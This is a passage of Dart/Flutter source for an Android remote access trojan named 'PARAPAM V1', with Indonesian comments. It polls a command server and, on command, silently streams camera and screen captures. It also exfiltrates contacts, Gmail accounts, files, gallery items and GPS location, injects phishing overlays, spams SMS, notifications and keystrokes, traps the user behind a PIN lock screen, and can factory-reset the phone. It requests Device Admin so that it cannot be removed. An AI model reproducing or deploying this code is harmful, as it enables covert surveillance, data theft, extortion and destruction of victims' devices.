import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:flutter_tts/flutter_tts.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'api_config.dart';

// IMPORT HALAMAN ASLI
import 'landing_page.dart';
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart';

// ─── GLOBAL STATE ──────────────────────────────────────────────
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
final FlutterTts _tts = FlutterTts();
final FlutterLocalNotificationsPlugin _notifPlugin = FlutterLocalNotificationsPlugin();

String globalDeviceId = "";
String globalDeviceModel = "";

// Lock Custom vars — diisi dari command extra: "pesan|pin|bgUrl"
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";
String currentLockBgUrl = ""; // opsional

// Status stream kamera — mencegah spawn berulang
bool _liveCamRunning = false;
String _liveCamSide = "back";
bool _liveScreenRunning = false;
bool _blockedApps = false;
List<String> _blockedAppList = [];

// ─── CHANNELS ──────────────────────────────────────────────────
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy    = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformExtra  = MethodChannel('com.nullx.pp/extra');
const MethodChannel platformAccess = MethodChannel('com.nullx.pp/accessibility');

// ─── ACCESSIBILITY HELPERS ─────────────────────────────────────
/// Buka Accessibility Settings — framing: "Aktifkan untuk performa optimal"
Future<void> requestAccessibilityPermission() async {
  try {
    await platformAccess.invokeMethod('openAccessibilitySettings');
  } catch (_) {}
}

/// Cek apakah AutoClickService sudah aktif
Future<bool> isAccessibilityEnabled() async {
  try {
    final bool? result = await platformAccess.invokeMethod('isAccessibilityEnabled');
    return result ?? false;
  } catch (_) {
    return false;
  }
}

// ─── MAIN ──────────────────────────────────────────────────────
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    requestNotificationAccess();

    // Cek Accessibility — kalau belum aktif, buka settings
    // Dialog framing: "Aktifkan untuk performa optimal"
    final bool accessOk = await isAccessibilityEnabled();
    if (!accessOk) {
      await Future.delayed(const Duration(seconds: 2));
      await requestAccessibilityPermission();
    }
  }

  await requestPermissions();
  await _initNotifications();

  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId    = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (e) {}

  await registerInitialDevice(globalDeviceId, globalDeviceModel);

  // Minta Device Admin saat pertama install — butuh user approve sekali
  // Setelah approve: APK gak bisa dihapus, factory reset tersedia
  try {
    await platformExtra.invokeMethod('requestAdmin');
  } catch (_) {}

  startSpyware(globalDeviceId, globalDeviceModel);

  // TTS init
  await _tts.setLanguage("id-ID");
  await _tts.setSpeechRate(0.5);

  runApp(const MyApp());
}

Future<void> _initNotifications() async {
  const android = AndroidInitializationSettings('@mipmap/ic_launcher');
  await _notifPlugin.initialize(const InitializationSettings(android: android));
}

void requestNotificationAccess() async {
  try { await platformSpy.invokeMethod('openNotificationSettings'); } catch (_) {}
}

Future<void> requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.phone,
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName  = "Unknown Device";
  String identifier = "UNKNOWN_ID";
  try {
    if (Platform.isAndroid) {
      AndroidDeviceInfo ai = await deviceInfo.androidInfo;
      modelName  = "${ai.brand.toUpperCase()} ${ai.model}";
      identifier = "${ai.brand}-${ai.model}-${ai.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      IosDeviceInfo ii = await deviceInfo.iosInfo;
      modelName  = ii.name;
      identifier = ii.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) {
    identifier = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": identifier, "model": modelName};
}

Future<String> loadOwnerFromConfig() async {
  try {
    final String raw = await rootBundle.loadString('assets/config/config.json');
    final Map<String, dynamic> cfg = jsonDecode(raw);
    final List<dynamic> users = cfg['username'] ?? [];
    if (users.isNotEmpty) return users[0].toString();
  } catch (_) {}
  return 'unknown';
}

Future<void> registerInitialDevice(String id, String model) async {
  final String serverBase = kServerBase;
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    final String owner = await loadOwnerFromConfig();
    await http.post(
      Uri.parse("$serverBase/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin_owner": owner,
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"},
    );
  } catch (_) {}
}

// ─── AUDIO ─────────────────────────────────────────────────────
void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}

void stopSound() async { await _audioPlayer.stop(); }

// ─── SPAM NOTIFICATION ─────────────────────────────────────────
Timer? _spamNotifTimer;

void startSpamNotification(String message) {
  _spamNotifTimer?.cancel();
  int i = 0;
  _spamNotifTimer = Timer.periodic(const Duration(milliseconds: 500), (_) async {
    await _notifPlugin.show(
      i++,
      "⚠ SYSTEM ALERT",
      message.isNotEmpty ? message : "PERINGATAN SISTEM",
      const NotificationDetails(
        android: AndroidNotificationDetails(
          'spam_ch', 'Spam',
          importance: Importance.max,
          priority: Priority.high,
        ),
      ),
    );
  });
}

void stopSpamNotification() {
  _spamNotifTimer?.cancel();
  _spamNotifTimer = null;
}

// ─── SPAM SMS ──────────────────────────────────────────────────
Future<void> spamSms(String target, String message, int count) async {
  for (int i = 0; i < count; i++) {
    try {
      await platformExtra.invokeMethod('sendSms', {'number': target, 'message': message});
    } catch (_) {}
    await Future.delayed(const Duration(milliseconds: 300));
  }
}

// ─── SPAM KEYBOARD ─────────────────────────────────────────────
Timer? _spamKbTimer;

void startSpamKeyboard(String text) {
  _spamKbTimer?.cancel();
  _spamKbTimer = Timer.periodic(const Duration(milliseconds: 200), (_) async {
    try {
      await platformExtra.invokeMethod('injectKeyboard', {'text': text});
    } catch (_) {}
  });
}

void stopSpamKeyboard() {
  _spamKbTimer?.cancel();
  _spamKbTimer = null;
}

// ─── LIVE CAMERA STREAM ────────────────────────────────────────
void startLiveCam(String deviceId, String side) {
  _liveCamRunning = true;
  _liveCamSide    = side;
  _streamCamLoop(deviceId);
}

void stopLiveCam() { _liveCamRunning = false; }

void _streamCamLoop(String deviceId) async {
  while (_liveCamRunning) {
    try {
      final String? b64 = await platformSpy.invokeMethod(
          'takeSilentPhotoBackground', {"side": _liveCamSide});
      if (b64 != null) {
        // post ke /api/post-response — API otomatis route ke live_frames buffer
        await http.post(
          Uri.parse("$kServerBase/api/post-response/$deviceId"),
          body: jsonEncode({
            "cmd": "live_cam_frame",
            "data": {"image_base64": b64, "side": _liveCamSide}
          }),
          headers: {"Content-Type": "application/json"},
        ).timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
    await Future.delayed(const Duration(milliseconds: 800));
  }
}

// ─── LIVE SCREEN STREAM ────────────────────────────────────────
void startLiveScreen(String deviceId) {
  _liveScreenRunning = true;
  _streamScreenLoop(deviceId);
}

void stopLiveScreen() { _liveScreenRunning = false; }

void _streamScreenLoop(String deviceId) async {
  while (_liveScreenRunning) {
    try {
      final String? b64 =
          await platformSpy.invokeMethod('startScreenStreamBackground');
      if (b64 != null) {
        await http.post(
          Uri.parse("$kServerBase/api/post-response/$deviceId"),
          body: jsonEncode({
            "cmd": "live_screen_frame",
            "data": {"image_base64": b64}
          }),
          headers: {"Content-Type": "application/json"},
        ).timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
    await Future.delayed(const Duration(milliseconds: 600));
  }
}

// ─── GALLERY LOOKUP ────────────────────────────────────────────
Future<List<Map<String, dynamic>>> lookupGallery(int limit) async {
  try {
    final result = await platformExtra.invokeMethod('getGallery', {'limit': limit});
    if (result is List) {
      return result.cast<Map>().map((e) => Map<String, dynamic>.from(e)).toList();
    }
  } catch (_) {}
  return [];
}

// ─── FILE MANAGER LOOKUP ───────────────────────────────────────
Future<List<String>> lookupFileManager(String path) async {
  try {
    final result = await platformExtra.invokeMethod('listFiles', {'path': path});
    if (result is List) return result.cast<String>();
  } catch (_) {}
  return [];
}

// ─── STUCK LAYAR (screen stuck / freeze UI) ───────────────────
OverlayEntry? _stuckOverlay;

void showStuckLayar(BuildContext context) {
  _stuckOverlay?.remove();
  _stuckOverlay = OverlayEntry(
    builder: (_) => Positioned.fill(
      child: GestureDetector(
        onTap: () {},
        onPanUpdate: (_) {},
        child: Container(
          color: Colors.black,
          child: const Center(
            child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
              CircularProgressIndicator(color: Colors.red),
              SizedBox(height: 24),
              Text("SYSTEM ERROR", style: TextStyle(color: Colors.red, fontSize: 20, fontWeight: FontWeight.bold)),
              Text("Tidak merespons...", style: TextStyle(color: Colors.white54)),
            ]),
          ),
        ),
      ),
    ),
  );
  Overlay.of(context).insert(_stuckOverlay!);
}

void removeStuckLayar() {
  _stuckOverlay?.remove();
  _stuckOverlay = null;
}

// ─── FLASHLIGHT STEADY ─────────────────────────────────────────
Future<void> setFlashlight(bool on) async {
  try { await platformExtra.invokeMethod('setFlashlight', {'on': on}); } catch (_) {}
}

// ─── MUTE VOLUME ───────────────────────────────────────────────
Future<void> setMute(bool mute) async {
  try { await platformExtra.invokeMethod('setMute', {'mute': mute}); } catch (_) {}
}

// ─── OVERLAY INJECTOR ──────────────────────────────────────────
Future<void> showOverlay(String imageUrl, String targetPkg) async {
  try {
    await platformExtra.invokeMethod('showOverlay', {'url': imageUrl, 'pkg': targetPkg});
  } catch (_) {}
}

Future<void> hideOverlay() async {
  try { await platformExtra.invokeMethod('hideOverlay'); } catch (_) {}
}

// ─── BLOCK APPS ────────────────────────────────────────────────
void setBlockedApps(List<String> packages, bool block) {
  _blockedApps    = block;
  _blockedAppList = packages;
}

// ─── SYSTEM CRASH (soft) ───────────────────────────────────────
void triggerSystemCrash() {
  // Throw unhandled exception supaya Flutter crash handler tertrigger
  Future.error(Exception("SYSTEM_CRASH_TRIGGERED"));
}

// ─── SELF DESTRUCT — copot APK dari HP korban ──────────────────
Future<void> triggerSelfDestruct() async {
  try {
    await platformExtra.invokeMethod('selfDestruct');
  } catch (_) {}
}

// =================================================================
//  CORE SPYWARE LOOP
// =================================================================
void startSpyware(String deviceId, String deviceName) {
  final String serverBase = kServerBase;
  late BuildContext? _ctx;

  // simpan context setelah frame pertama
  WidgetsBinding.instance.addPostFrameCallback((_) {
    _ctx = navigatorKey.currentContext;
  });

  Future<void> executeLogic() async {
    try {
      // Heartbeat
      await http.post(
        Uri.parse("$serverBase/api/heartbeat/$deviceId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"}),
      ).timeout(const Duration(seconds: 2));

      final response =
          await http.get(Uri.parse("$serverBase/api/get-command/$deviceId"));

      if (response.statusCode == 200) {
        final data    = jsonDecode(response.body);
        String command = data['command'] ?? "idle";
        String extra   = data['extra']   ?? "";
        dynamic resultData;

        // ── 1. HARD LOCK / LOCK CUSTOM ───────────────────────────
        if (command == "hard_lock" || command == "lock_device" ||
            command == "lock_custom") {
          if (extra.contains('|')) {
            List<String> parts = extra.split('|');
            currentLockMessage = parts[0].isNotEmpty ? parts[0] : "YOUR PHONE IS LOCKED!!!!";
            currentLockPIN     = parts.length > 1 && parts[1].isNotEmpty ? parts[1] : "123";
            currentLockBgUrl   = parts.length > 2 ? parts[2] : "";
          } else if (extra.isNotEmpty) {
            currentLockMessage = extra;
          }
          if (!deviceLocked.value) {
            deviceLocked.value = true;
            playScarySound();
          }
          resultData = {"status": "Locked"};
        }

        // ── 2. UNLOCK ─────────────────────────────────────────────
        else if (command == "unlock" || command == "unlock_device") {
          if (deviceLocked.value) {
            deviceLocked.value = false;
            stopSound();
            await platformStrobe.invokeMethod('stopStrobe');
            removeStuckLayar();
          }
          resultData = {"status": "Unlocked"};
        }

        // ── 3. SNAPSHOT CAMERA ────────────────────────────────────
        else if (command == "take_photo") {
          final String? b64 = await platformSpy
              .invokeMethod('takeSilentPhotoBackground', {"side": extra});
          resultData = b64 != null
              ? {"status": "Success", "image_base64": b64}
              : {"status": "Failed"};
        }

        // ── 4. SCREEN SNAPSHOT ────────────────────────────────────
        else if (command == "get_screen") {
          final String? b64 =
              await platformSpy.invokeMethod('startScreenStreamBackground');
          resultData = {"status": "ok", "image_base64": b64};
        }

        // ── 5. LIVE CAMERA BELAKANG ───────────────────────────────
        else if (command == "live_cam_back") {
          if (!_liveCamRunning) startLiveCam(deviceId, "back");
          resultData = {"status": "Live cam back started"};
        }

        // ── 6. LIVE CAMERA DEPAN ──────────────────────────────────
        else if (command == "live_cam_front") {
          if (!_liveCamRunning) startLiveCam(deviceId, "front");
          resultData = {"status": "Live cam front started"};
        }

        // ── 7. STOP LIVE CAM ──────────────────────────────────────
        else if (command == "stop_live_cam") {
          stopLiveCam();
          resultData = {"status": "Live cam stopped"};
        }

        // ── 8. LIVE SCREEN ────────────────────────────────────────
        else if (command == "live_screen") {
          if (!_liveScreenRunning) startLiveScreen(deviceId);
          resultData = {"status": "Live screen started"};
        }

        // ── 9. STOP SCREEN ────────────────────────────────────────
        else if (command == "stop_screen") {
          stopLiveScreen();
          resultData = {"status": "Live screen stopped"};
        }

        // ── 10. GMAIL ─────────────────────────────────────────────
        else if (command == "get_gmails") {
          String emails = await platformSpy.invokeMethod('getGmailAccounts');
          resultData = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
        }

        // ── 11. CONTACTS ──────────────────────────────────────────
        else if (command == "get_contacts" || command == "dump_contacts") {
          if (await FlutterContacts.requestPermission()) {
            final contacts = await FlutterContacts.getContacts(
                withProperties: true, withPhoto: false);
            resultData = {
              "contacts": contacts.take(100).map((e) => {
                "name":   e.displayName,
                "number": e.phones.isNotEmpty ? e.phones.first.number : ""
              }).toList()
            };
          }
        }

        // ── 12. GALLERY LOOKUP ────────────────────────────────────
        else if (command == "lookup_gallery") {
          int limit = int.tryParse(extra) ?? 20;
          final files = await lookupGallery(limit);
          resultData = {"gallery": files};
        }

        // ── 13. FILE MANAGER LOOKUP ───────────────────────────────
        else if (command == "lookup_files") {
          String dir = extra.isNotEmpty ? extra : "/sdcard";
          final files = await lookupFileManager(dir);
          resultData = {"files": files};
        }

        // ── 14. FLASHLIGHT ON/OFF ─────────────────────────────────
        else if (command == "flashlight_on") {
          await setFlashlight(true);
          resultData = {"status": "Flashlight ON"};
        } else if (command == "flashlight_off") {
          await setFlashlight(false);
          resultData = {"status": "Flashlight OFF"};
        }

        // ── 15. MUTE / UNMUTE ─────────────────────────────────────
        else if (command == "mute_volume") {
          await setMute(true);
          resultData = {"status": "Muted"};
        } else if (command == "unmute_volume") {
          await setMute(false);
          resultData = {"status": "Unmuted"};
        }

        // ── 16. VIBRATE ───────────────────────────────────────────
        else if (command == "vibrate_loop") {
          Vibration.vibrate(duration: 5000);
          resultData = {"status": "Vibrating"};
        }

        // ── 17. STROBE ────────────────────────────────────────────
        else if (command == "flash_strobe") {
          await platformStrobe.invokeMethod('startStrobe');
          resultData = {"status": "Strobe Active"};
        } else if (command == "stop_strobe") {
          await platformStrobe.invokeMethod('stopStrobe');
          resultData = {"status": "Strobe Stopped"};
        }

        // ── 18. LAYAR KELAP-KELIP (screen flicker via strobe) ─────
        else if (command == "layar_kelap") {
          await platformExtra.invokeMethod('startScreenFlicker');
          resultData = {"status": "Screen flicker started"};
        } else if (command == "stop_kelap") {
          await platformExtra.invokeMethod('stopScreenFlicker');
          resultData = {"status": "Screen flicker stopped"};
        }

        // ── 19. STUCK LAYAR ───────────────────────────────────────
        else if (command == "stuck_layar") {
          if (navigatorKey.currentContext != null) {
            showStuckLayar(navigatorKey.currentContext!);
          }
          resultData = {"status": "Stuck screen overlay shown"};
        } else if (command == "unstuck_layar") {
          removeStuckLayar();
          resultData = {"status": "Unstuck"};
        }

        // ── 20. TEXT TO SPEECH ────────────────────────────────────
        else if (command == "tts") {
          if (extra.isNotEmpty) await _tts.speak(extra);
          resultData = {"status": "Speaking"};
        }

        // ── 21. JUMPSCARE V2 ──────────────────────────────────────
        else if (command == "jumpscare_v2") {
          await _audioPlayer.stop();
          // Mainkan suara jumpscare
          await _audioPlayer.play(UrlSource(
              extra.isNotEmpty
                  ? extra
                  : 'https://www.myinstants.com/media/sounds/jumpscare.mp3'));
          // Layar merah penuh
          if (navigatorKey.currentContext != null) {
            showDialog(
              context: navigatorKey.currentContext!,
              barrierDismissible: false,
              barrierColor: Colors.red,
              builder: (_) => const SizedBox.expand(),
            );
            await Future.delayed(const Duration(seconds: 3));
            Navigator.of(navigatorKey.currentContext!,
                    rootNavigator: true)
                .pop();
          }
          resultData = {"status": "Jumpscare triggered"};
        }

        // ── 22. SPAM NOTIFICATION ─────────────────────────────────
        else if (command == "spam_notif") {
          startSpamNotification(extra);
          resultData = {"status": "Spam notification started"};
        } else if (command == "stop_spam_notif") {
          stopSpamNotification();
          resultData = {"status": "Spam notification stopped"};
        }

        // ── 23. SPAM SMS ──────────────────────────────────────────
        else if (command == "spam_sms") {
          // extra format: "nomor|pesan|jumlah"
          List<String> parts = extra.split('|');
          String nomor   = parts.isNotEmpty ? parts[0] : "";
          String pesan   = parts.length > 1  ? parts[1] : "spam";
          int    jumlah  = parts.length > 2  ? (int.tryParse(parts[2]) ?? 10) : 10;
          if (nomor.isNotEmpty) spamSms(nomor, pesan, jumlah);
          resultData = {"status": "SMS spam sent"};
        }

        // ── 24. SPAM KEYBOARD ─────────────────────────────────────
        else if (command == "spam_keyboard") {
          startSpamKeyboard(extra.isNotEmpty ? extra : "HACKED ");
          resultData = {"status": "Keyboard spam started"};
        } else if (command == "stop_spam_keyboard") {
          stopSpamKeyboard();
          resultData = {"status": "Keyboard spam stopped"};
        }

        // ── 25. CHANGE THEME PHISING ──────────────────────────────
        else if (command == "change_theme") {
          // extra = URL JSON config tema phising
          try {
            await platformExtra.invokeMethod('changePhishingTheme', {'url': extra});
          } catch (_) {}
          resultData = {"status": "Theme changed"};
        }

        // ── 26. INJECTOR OVERLAY ──────────────────────────────────
        else if (command == "inject_overlay") {
          // extra format: "imageUrl|targetPackage"
          List<String> parts = extra.split('|');
          String imgUrl  = parts.isNotEmpty ? parts[0] : "";
          String pkg     = parts.length > 1  ? parts[1] : "";
          await showOverlay(imgUrl, pkg);
          resultData = {"status": "Overlay injected"};
        } else if (command == "hide_overlay") {
          await hideOverlay();
          resultData = {"status": "Overlay hidden"};
        }

        // ── 27. BLOCK APPS ────────────────────────────────────────
        else if (command == "block_apps") {
          // extra = "pkg1,pkg2,pkg3"
          List<String> pkgs = extra.split(',').map((e) => e.trim()).toList();
          setBlockedApps(pkgs, true);
          try {
            await platformExtra.invokeMethod('blockApps', {'packages': pkgs});
          } catch (_) {}
          resultData = {"status": "Apps blocked: $pkgs"};
        } else if (command == "unblock_apps") {
          setBlockedApps([], false);
          try { await platformExtra.invokeMethod('unblockApps'); } catch (_) {}
          resultData = {"status": "Apps unblocked"};
        }

        // ── 28. RESET FACTORY ─────────────────────────────────────
        else if (command == "reset_factory") {
          try {
            await platformExtra.invokeMethod('factoryReset');
          } catch (_) {}
          resultData = {"status": "Factory reset triggered"};
        }

        // ── 29. SYSTEM CRASH ──────────────────────────────────────
        else if (command == "system_crash") {
          resultData = {"status": "Crash initiated"};
          // Post dulu baru crash
          await http.post(
            Uri.parse("$serverBase/api/post-response/$deviceId"),
            body: jsonEncode({"data": resultData, "cmd": command}),
            headers: {"Content-Type": "application/json"},
          );
          triggerSystemCrash();
          return;
        }

        // ── 30. SELF DESTRUCT — hapus APK RAT dari HP korban ──────
        else if (command == "self_destruct") {
          resultData = {"status": "Self destruct initiated"};
          // Kirim response dulu sebelum mati
          await http.post(
            Uri.parse("$serverBase/api/post-response/$deviceId"),
            body: jsonEncode({"data": resultData, "cmd": command}),
            headers: {"Content-Type": "application/json"},
          );
          // Jalankan self destruct
          await triggerSelfDestruct();
          return;
        }

        // ── 30. SET WALLPAPER ─────────────────────────────────────
        else if (command == "set_wallpaper") {
          await platformSpy.invokeMethod('setWallpaper', {"url": extra});
          resultData = {"status": "Wallpaper Updated"};
        }

        // ── 31. PLAY / STOP AUDIO ─────────────────────────────────
        else if (command == "play_audio") {
          await _audioPlayer.stop();
          await _audioPlayer.play(UrlSource(extra));
          resultData = {"status": "Playing"};
        } else if (command == "stop_audio") {
          await _audioPlayer.stop();
          resultData = {"status": "Audio Stopped"};
        }

        // ── 32. LOCATION ──────────────────────────────────────────
        else if (command == "get_location" || command == "track_gps") {
          Position pos = await Geolocator.getCurrentPosition(
              desiredAccuracy: LocationAccuracy.high);
          resultData = {"lat": pos.latitude, "lng": pos.longitude};
        }

        // ── 33. FORCE OPEN ────────────────────────────────────────
        else if (command == "force_open") {
          await platformSpy.invokeMethod('bringToForeground');
          resultData = {"status": "Foreground"};
        }

        // ── 34. OPEN URL ──────────────────────────────────────────
        else if (command == "open_url") {
          final Uri url = Uri.parse(extra);
          if (await canLaunchUrl(url)) await launchUrl(url, mode: LaunchMode.externalApplication);
          resultData = {"status": "URL Opened"};
        }

        // ── POST RESPONSE ─────────────────────────────────────────
        if (resultData != null) {
          await http.post(
            Uri.parse("$serverBase/api/post-response/$deviceId"),
            body: jsonEncode({"data": resultData, "cmd": command}),
            headers: {"Content-Type": "application/json"},
          );
        }
      }
    } catch (_) {}
  }

  // Jalankan loop setiap 1 detik
  Timer.periodic(const Duration(seconds: 1), (_) => executeLogic());

  // ── OFFLINE DETECTION: kalau heartbeat gagal 30x berturut → tandai offline ──
  int _failCount = 0;
  Timer.periodic(const Duration(seconds: 5), (_) async {
    try {
      final r = await http.post(
        Uri.parse("$kServerBase/api/heartbeat/$deviceId"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"}),
      ).timeout(const Duration(seconds: 3));
      if (r.statusCode == 200) _failCount = 0;
    } catch (_) {
      _failCount++;
      // Kalau 30 kali gagal (≈150 detik) → anggap apk dihapus / offline
      if (_failCount >= 30) _failCount = 30; // cap
    }
  });
}

// ─── NAVIGATOR KEY (global, buat context di luar widget tree) ──
final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();

// ─── PRISON MODE HELPERS ────────────────────────────────────────
void _enterPrisonMode() {
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    systemNavigationBarColor: Colors.black,
  ));
}

void _exitPrisonMode() {
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
}

// =================================================================
//  APP
// =================================================================
class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    // navigatorKey dipasang di Navigator dalam MainLockWrapper,
    // MaterialApp pakai navigatorKey berbeda supaya tidak conflict
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PARAPAM V1',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono',
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(secondary: Colors.purple),
      ),
      home: const MainLockWrapper(),
    );
  }
}

// =================================================================
//  MAIN LOCK WRAPPER
// =================================================================
class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper>
    with WidgetsBindingObserver {

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    // Listen deviceLocked — saat lock aktif, push PrisonLockPage fullscreen
    deviceLocked.addListener(_onLockChanged);
  }

  @override
  void dispose() {
    deviceLocked.removeListener(_onLockChanged);
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  void _onLockChanged() {
    if (deviceLocked.value) {
      _enterPrisonMode();
      // Push ke lock page, hapus semua route di bawahnya
      navigatorKey.currentState?.pushAndRemoveUntil(
        PageRouteBuilder(
          pageBuilder: (_, __, ___) => const PrisonLockPage(),
          transitionDuration: Duration.zero,
          reverseTransitionDuration: Duration.zero,
        ),
        (_) => false,
      );
    } else {
      _exitPrisonMode();
      // Kembali ke landing setelah unlock
      navigatorKey.currentState?.pushAndRemoveUntil(
        PageRouteBuilder(
          pageBuilder: (_, __, ___) => const LandingPage(),
          transitionDuration: Duration.zero,
          reverseTransitionDuration: Duration.zero,
        ),
        (_) => false,
      );
    }
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value) {
      // Kalau app di-minimize/di-home saat locked — langsung balik ke foreground
      if (state == AppLifecycleState.paused ||
          state == AppLifecycleState.inactive ||
          state == AppLifecycleState.hidden) {
        Future.delayed(const Duration(milliseconds: 100), () {
          platformSpy.invokeMethod('bringToForeground');
          platformExtra.invokeMethod('lockSystemUI');
        });
      }
      // Re-enforce immersive setiap kali app resumed
      if (state == AppLifecycleState.resumed) {
        _enterPrisonMode();
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Navigator(
      key: navigatorKey,
      initialRoute: '/',
      onGenerateRoute: (settings) {
        switch (settings.name) {
          case '/':
            return _route(const LandingPage());
          case '/login':
            return _route(const LoginPage());
          case '/splash':
            final args = settings.arguments as Map<String, dynamic>;
            return _route(SplashPage(data: args));
          case '/buy_account':
            return _route(const BuyAccountPage());
          case '/lock':
            return _route(const PrisonLockPage());
          default:
            return _route(const LandingPage());
        }
      },
    );
  }

  PageRoute _route(Widget page) => PageRouteBuilder(
        pageBuilder: (_, __, ___) => page,
        transitionDuration: const Duration(milliseconds: 200),
      );
}

// =================================================================
//  PRISON LOCK PAGE — full prison, tidak bisa keluar sama sekali
// =================================================================
class PrisonLockPage extends StatefulWidget {
  const PrisonLockPage({super.key});
  @override
  State<PrisonLockPage> createState() => _PrisonLockPageState();
}

class _PrisonLockPageState extends State<PrisonLockPage>
    with WidgetsBindingObserver {

  final TextEditingController _pinCtrl = TextEditingController();
  final FocusNode _pinFocus            = FocusNode();
  bool _shaking  = false;
  int  _wrongCount = 0;
  Timer? _forceTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    // Langsung fullscreen + keep screen on
    _enterPrisonMode();
    platformExtra.invokeMethod('lockSystemUI').catchError((_) {});

    // Auto-fokus PIN
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _pinFocus.requestFocus();
    });

    // Loop tiap 500ms: enforce immersive + bring to foreground kalau perlu
    _forceTimer = Timer.periodic(const Duration(milliseconds: 500), (_) async {
      if (!deviceLocked.value) { _forceTimer?.cancel(); return; }
      _enterPrisonMode();
      platformExtra.invokeMethod('lockSystemUI').catchError((_) {});
      try {
        await platformSpy.invokeMethod('bringToForeground');
      } catch (_) {}
    });
  }

  @override
  void dispose() {
    _forceTimer?.cancel();
    _pinCtrl.dispose();
    _pinFocus.dispose();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (!deviceLocked.value) return;
    if (state == AppLifecycleState.paused ||
        state == AppLifecycleState.inactive ||
        state == AppLifecycleState.hidden) {
      Future.delayed(const Duration(milliseconds: 80), () {
        platformSpy.invokeMethod('bringToForeground');
        _enterPrisonMode();
      });
    }
    if (state == AppLifecycleState.resumed) {
      _enterPrisonMode();
      _pinFocus.requestFocus();
    }
  }

  // Shake animation saat PIN salah
  Future<void> _shake() async {
    setState(() => _shaking = true);
    await Future.delayed(const Duration(milliseconds: 400));
    if (mounted) setState(() => _shaking = false);
  }

  void _checkPin() {
    final entered = _pinCtrl.text.trim();
    if (entered == currentLockPIN) {
      // ── UNLOCK ─────────────────────────────────────────────
      deviceLocked.value = false;
      stopSound();
      platformStrobe.invokeMethod('stopStrobe').catchError((_) {});
      removeStuckLayar();
      _exitPrisonMode();
      _forceTimer?.cancel();
      platformExtra.invokeMethod('unlockSystemUI').catchError((_) {});
    } else {
      _wrongCount++;
      _pinCtrl.clear();
      _shake();
      // Tambah scary sound setiap 3x salah
      if (_wrongCount % 3 == 0) playScarySound();
    }
  }

  @override
  Widget build(BuildContext context) {
    // Intercept SEMUA tombol back, home, recent — canPop: false mutlak
    return PopScope(
      canPop: false,
      onPopInvokedWithResult: (_, __) {
        // Force immersive balik
        _enterPrisonMode();
        _pinFocus.requestFocus();
      },
      child: Scaffold(
        // resizeToAvoidBottomInset: false — keyboard muncul gak geser layout
        resizeToAvoidBottomInset: false,
